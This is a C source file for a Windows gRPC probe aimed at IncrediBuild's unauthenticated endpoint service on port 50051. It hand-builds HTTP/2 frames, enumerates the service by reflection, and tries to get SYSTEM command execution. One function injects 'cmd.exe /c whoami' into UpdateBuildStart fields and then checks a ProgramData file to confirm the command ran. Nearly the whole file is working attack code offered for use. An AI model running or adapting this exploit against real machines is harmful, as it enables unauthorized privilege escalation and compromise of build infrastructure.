/*
 * grpc_probe.c — Raw HTTP/2 gRPC probe for IncrediBuild endpointService:50051
 *
 * Sends gRPC calls without SSL/auth (service has enableSSL=false):
 *   1. gRPC reflection → enumerate services/methods
 *   2. UpdateBuildStart → try to trigger SYSTEM code execution
 *
 * Build: cl /nologo grpc_probe.c /Fe:grpc_probe.exe /link ws2_32.lib
 */
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#pragma comment(lib, "ws2_32.lib")

/* ============================================================
 * HTTP/2 frame helpers
 * ============================================================ */

static void write_be24(unsigned char *b, unsigned int v) {
    b[0] = (v >> 16) & 0xFF;
    b[1] = (v >> 8)  & 0xFF;
    b[2] =  v        & 0xFF;
}

static void write_be32(unsigned char *b, unsigned int v) {
    b[0] = (v >> 24) & 0xFF;
    b[1] = (v >> 16) & 0xFF;
    b[2] = (v >> 8)  & 0xFF;
    b[3] =  v        & 0xFF;
}

/* Send all bytes — blocks until done or error */
static int send_all(SOCKET s, const unsigned char *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int r = send(s, (const char*)(buf + sent), len - sent, 0);
        if (r == SOCKET_ERROR) return -1;
        sent += r;
    }
    return sent;
}

/* Receive exactly n bytes */
static int recv_exactly(SOCKET s, unsigned char *buf, int n) {
    int got = 0;
    while (got < n) {
        int r = recv(s, (char*)(buf + got), n - got, 0);
        if (r <= 0) return got;
        got += r;
    }
    return got;
}

/* Receive up to n bytes with timeout */
static int recv_available(SOCKET s, unsigned char *buf, int n, int ms) {
    fd_set fds; FD_ZERO(&fds); FD_SET(s, &fds);
    struct timeval tv = { ms/1000, (ms%1000)*1000 };
    int sel = select(0, &fds, NULL, NULL, &tv);
    if (sel <= 0) return 0;
    return recv(s, (char*)buf, n, 0);
}

/* ============================================================
 * HPACK minimal encoder — enough for our headers
 * ============================================================ */

static unsigned char *hpack_add_indexed(unsigned char *p, int idx) {
    *p++ = (unsigned char)(0x80 | idx);
    return p;
}

static unsigned char *hpack_add_literal_new(unsigned char *p, const char *name, const char *value) {
    int nlen = (int)strlen(name);
    int vlen = (int)strlen(value);
    *p++ = 0x00;          /* literal without indexing, new name */
    *p++ = (unsigned char)nlen;
    memcpy(p, name, nlen); p += nlen;
    *p++ = (unsigned char)vlen;
    memcpy(p, value, vlen); p += vlen;
    return p;
}

static unsigned char *hpack_add_literal_indexed_name(unsigned char *p, int idx, const char *value) {
    int vlen = (int)strlen(value);
    /* literal without indexing, indexed name */
    if (idx < 16) {
        *p++ = (unsigned char)(0x00 | idx);
    } else {
        *p++ = 0x0F;
        *p++ = (unsigned char)(idx - 15);
    }
    *p++ = (unsigned char)vlen;
    memcpy(p, value, vlen); p += vlen;
    return p;
}

/* Build HEADERS frame bytes → returns length */
static int build_headers_frame(unsigned char *out, int stream_id, const char *path, int end_stream) {
    unsigned char hpack[512];
    unsigned char *h = hpack;

    /* :method POST (static index 3) */
    h = hpack_add_indexed(h, 3);
    /* :scheme http (static index 6) */
    h = hpack_add_indexed(h, 6);
    /* :authority 127.0.0.1:50051 (literal, name index 1) */
    h = hpack_add_literal_indexed_name(h, 1, "127.0.0.1:50051");
    /* :path (literal, name index 4) */
    h = hpack_add_literal_indexed_name(h, 4, path);
    /* content-type: application/grpc (literal new) */
    h = hpack_add_literal_new(h, "content-type", "application/grpc");
    /* te: trailers (required by gRPC) */
    h = hpack_add_literal_new(h, "te", "trailers");

    int hlen = (int)(h - hpack);
    /* Frame header: 9 bytes */
    write_be24(out, hlen);
    out[3] = 0x01;   /* HEADERS type */
    out[4] = 0x04 | (end_stream ? 0x01 : 0x00); /* END_HEADERS | optional END_STREAM */
    write_be32(out + 5, (unsigned int)stream_id);
    memcpy(out + 9, hpack, hlen);
    return 9 + hlen;
}

/* Build DATA frame (with gRPC length prefix) */
static int build_data_frame(unsigned char *out, int stream_id, const unsigned char *msg, int mlen) {
    /* gRPC message: 1 byte compressed flag + 4 bytes length + message */
    unsigned char grpc[4096];
    grpc[0] = 0x00; /* not compressed */
    grpc[1] = (unsigned char)(mlen >> 24);
    grpc[2] = (unsigned char)(mlen >> 16);
    grpc[3] = (unsigned char)(mlen >> 8);
    grpc[4] = (unsigned char)(mlen);
    if (mlen > 0) memcpy(grpc + 5, msg, mlen);
    int plen = 5 + mlen;

    write_be24(out, plen);
    out[3] = 0x00;  /* DATA type */
    out[4] = 0x01;  /* END_STREAM */
    write_be32(out + 5, (unsigned int)stream_id);
    memcpy(out + 9, grpc, plen);
    return 9 + plen;
}

/* Read HTTP/2 frames and dump them; extract gRPC DATA payload */
static void read_response(SOCKET s, int timeout_ms) {
    unsigned char buf[65536];
    int total = 0;

    for (;;) {
        int n = recv_available(s, buf + total, (int)sizeof(buf) - total, timeout_ms);
        if (n <= 0) break;
        total += n;
        timeout_ms = 500; /* shorter wait after first data */
    }

    printf("[*] Response total: %d bytes\n", total);
    if (total == 0) { printf("[-] No response\n"); return; }

    /* Parse frames */
    int pos = 0;
    while (pos + 9 <= total) {
        int flen = ((int)buf[pos] << 16) | ((int)buf[pos+1] << 8) | buf[pos+2];
        int ftype = buf[pos+3];
        int fflags = buf[pos+4];
        unsigned int fstream = ((unsigned int)buf[pos+5] << 24) | ((unsigned int)buf[pos+6] << 16)
                             | ((unsigned int)buf[pos+7] << 8) | buf[pos+8];

        const char *tname = "UNKNOWN";
        switch (ftype) {
            case 0: tname="DATA"; break;
            case 1: tname="HEADERS"; break;
            case 3: tname="RST_STREAM"; break;
            case 4: tname="SETTINGS"; break;
            case 7: tname="GOAWAY"; break;
            case 8: tname="WINDOW_UPDATE"; break;
        }
        printf("[FRAME] type=%s(%d) len=%d flags=0x%02X stream=%u\n",
               tname, ftype, flen, fflags, fstream);

        if (ftype == 0 && flen > 5) {
            /* gRPC DATA: 1 byte compressed + 4 byte len + message */
            int off = pos + 9;
            int compressed = buf[off];
            int mlen = ((int)buf[off+1]<<24)|((int)buf[off+2]<<16)|((int)buf[off+3]<<8)|buf[off+4];
            printf("  gRPC: compressed=%d msglen=%d\n", compressed, mlen);
            printf("  gRPC payload: ");
            for (int i = 0; i < flen - 5 && i < 512; i++) {
                unsigned char c = buf[off+5+i];
                if (c >= 0x20 && c < 0x7F) printf("%c", c);
                else printf("\\x%02X", c);
            }
            printf("\n");
        }
        if (ftype == 1 && flen > 0) {
            /* HEADERS: print raw HPACK as hex + printable */
            printf("  HEADERS raw: ");
            for (int i = 0; i < flen && i < 256; i++) {
                unsigned char c = buf[pos+9+i];
                printf("%02X ", c);
            }
            printf("\n  ASCII: ");
            for (int i = 0; i < flen && i < 256; i++) {
                unsigned char c = buf[pos+9+i];
                if (c >= 0x20 && c < 0x7F) printf("%c", c);
                else printf(".");
            }
            printf("\n");
        }

        pos += 9 + flen;
        if (flen == 0 && ftype == 4 && fflags == 0x01) continue; /* SETTINGS_ACK */
    }
}

/* ============================================================
 * Main probe logic
 * ============================================================ */

static SOCKET connect_grpc(const char *host, int port) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)port);
    inet_pton(AF_INET, host, &sa.sin_addr);

    if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        printf("[-] Connect failed: %d\n", WSAGetLastError());
        return INVALID_SOCKET;
    }
    printf("[+] Connected to %s:%d\n", host, port);

    /* Send HTTP/2 client preface */
    const char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    unsigned char settings_frame[] = { 0,0,0, 0x04, 0x00, 0,0,0,0 }; /* empty SETTINGS */

    send_all(s, (const unsigned char*)preface, (int)strlen(preface));
    send_all(s, settings_frame, sizeof(settings_frame));

    /* Read server preface (SETTINGS) and send ACK */
    Sleep(300);
    unsigned char tmp[4096];
    int n = recv_available(s, tmp, sizeof(tmp), 500);
    printf("[*] Server preface: %d bytes\n", n);

    /* Send SETTINGS_ACK */
    unsigned char settings_ack[] = { 0,0,0, 0x04, 0x01, 0,0,0,0 };
    send_all(s, settings_ack, sizeof(settings_ack));

    return s;
}

static void probe_reflection(SOCKET s, int stream_id) {
    printf("\n=== gRPC Reflection: ListServices ===\n");

    unsigned char frame[1024];
    int n;

    /* HEADERS */
    n = build_headers_frame(frame, stream_id,
                            "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo", 0);
    send_all(s, frame, n);

    /* DATA: ServerReflectionRequest { list_services = "" }
     * field 6 (list_services) wire type 2 (LEN), value = empty string
     * = 0x32 0x00 */
    unsigned char req[] = { 0x32, 0x00 };
    n = build_data_frame(frame, stream_id, req, sizeof(req));
    send_all(s, frame, n);

    read_response(s, 2000);
}

static void probe_update_build_start(SOCKET s, int stream_id) {
    printf("\n=== UpdateBuildStart: empty proto message ===\n");

    unsigned char frame[1024];
    int n;

    /* HEADERS */
    n = build_headers_frame(frame, stream_id,
                            "/endpoint.v1.EndpointService/UpdateBuildStart", 0);
    send_all(s, frame, n);

    /* Empty proto message */
    n = build_data_frame(frame, stream_id, NULL, 0);
    send_all(s, frame, n);

    read_response(s, 2000);
}

static void probe_report_health(SOCKET s, int stream_id) {
    printf("\n=== ReportHealthStatus: minimal message ===\n");

    unsigned char frame[1024];
    int n;

    n = build_headers_frame(frame, stream_id,
                            "/endpoint.v1.EndpointService/ReportHealthStatus", 0);
    send_all(s, frame, n);

    /* Try field 1 = string "test" (machine_id?)
     * 0x0A = field 1, wire type 2 (LEN)
     * 0x04 = length 4
     * "test" */
    unsigned char req[] = { 0x0A, 0x04, 't','e','s','t' };
    n = build_data_frame(frame, stream_id, req, sizeof(req));
    send_all(s, frame, n);

    read_response(s, 2000);
}

static void probe_update_build_start_with_command(SOCKET s, int stream_id) {
    printf("\n=== UpdateBuildStart: inject command in fields ===\n");

    unsigned char frame[2048];
    int n;

    n = build_headers_frame(frame, stream_id,
                            "/endpoint.v1.EndpointService/UpdateBuildStart", 0);
    send_all(s, frame, n);

    /* Attempt: populate multiple fields hoping one is a command/path
     * Field 1 (string) = build_id = "AAAA-BBBB"
     * Field 2 (string) = tool/command = "cmd.exe"
     * Field 3 (string) = arguments = "/c whoami > C:\\ProgramData\\lpe.txt"
     * Field 4 (string) = working_dir = "C:\\"
     */
    unsigned char req[512];
    int rlen = 0;

    const char *f1 = "AAAA-BBBB-CCCC";
    req[rlen++] = 0x0A; req[rlen++] = (unsigned char)strlen(f1);
    memcpy(req+rlen, f1, strlen(f1)); rlen += (int)strlen(f1);

    const char *f2 = "cmd.exe";
    req[rlen++] = 0x12; req[rlen++] = (unsigned char)strlen(f2);
    memcpy(req+rlen, f2, strlen(f2)); rlen += (int)strlen(f2);

    const char *f3 = "/c whoami /all > C:\\ProgramData\\ib_lpe.txt 2>&1";
    req[rlen++] = 0x1A; req[rlen++] = (unsigned char)strlen(f3);
    memcpy(req+rlen, f3, strlen(f3)); rlen += (int)strlen(f3);

    const char *f4 = "C:\\";
    req[rlen++] = 0x22; req[rlen++] = (unsigned char)strlen(f4);
    memcpy(req+rlen, f4, strlen(f4)); rlen += (int)strlen(f4);

    n = build_data_frame(frame, stream_id, req, rlen);
    send_all(s, frame, n);

    read_response(s, 3000);

    /* Check if command executed */
    HANDLE hf = CreateFileA("C:\\ProgramData\\ib_lpe.txt", GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        char out[4096] = {0};
        DWORD rd = 0;
        ReadFile(hf, out, sizeof(out)-1, &rd, NULL);
        CloseHandle(hf);
        printf("[!!!] COMMAND EXECUTED! Output:\n%s\n", out);
    } else {
        printf("[-] No command execution (ib_lpe.txt not created)\n");
    }
}

static void probe_manager_health(SOCKET s, int stream_id) {
    printf("\n=== ManagerHealthCheck (probe Manager service info) ===\n");

    unsigned char frame[1024];
    int n;

    n = build_headers_frame(frame, stream_id,
                            "/endpoint.v1.EndpointService/ManagerHealthCheck", 0);
    send_all(s, frame, n);

    n = build_data_frame(frame, stream_id, NULL, 0);
    send_all(s, frame, n);

    read_response(s, 2000);
}

int main(int argc, char *argv[]) {
    const char *host = "127.0.0.1";
    int port = 50051;

    if (argc >= 2) port = atoi(argv[1]);

    printf("[*] gRPC probe → %s:%d\n", host, port);

    /* Use separate connections per call (stream_id=1 per connection) */

    SOCKET s;

    /* 1. gRPC reflection */
    s = connect_grpc(host, port);
    if (s != INVALID_SOCKET) {
        probe_reflection(s, 1);
        closesocket(s);
    }

    Sleep(200);

    /* 2. ReportHealthStatus */
    s = connect_grpc(host, port);
    if (s != INVALID_SOCKET) {
        probe_report_health(s, 1);
        closesocket(s);
    }

    Sleep(200);

    /* 3. UpdateBuildStart empty */
    s = connect_grpc(host, port);
    if (s != INVALID_SOCKET) {
        probe_update_build_start(s, 1);
        closesocket(s);
    }

    Sleep(200);

    /* 4. UpdateBuildStart with injected command fields */
    s = connect_grpc(host, port);
    if (s != INVALID_SOCKET) {
        probe_update_build_start_with_command(s, 1);
        closesocket(s);
    }

    Sleep(200);

    /* 5. ManagerHealthCheck */
    s = connect_grpc(host, port);
    if (s != INVALID_SOCKET) {
        probe_manager_health(s, 1);
        closesocket(s);
    }

    WSACleanup();
    printf("\n[*] Done\n");
    return 0;
}
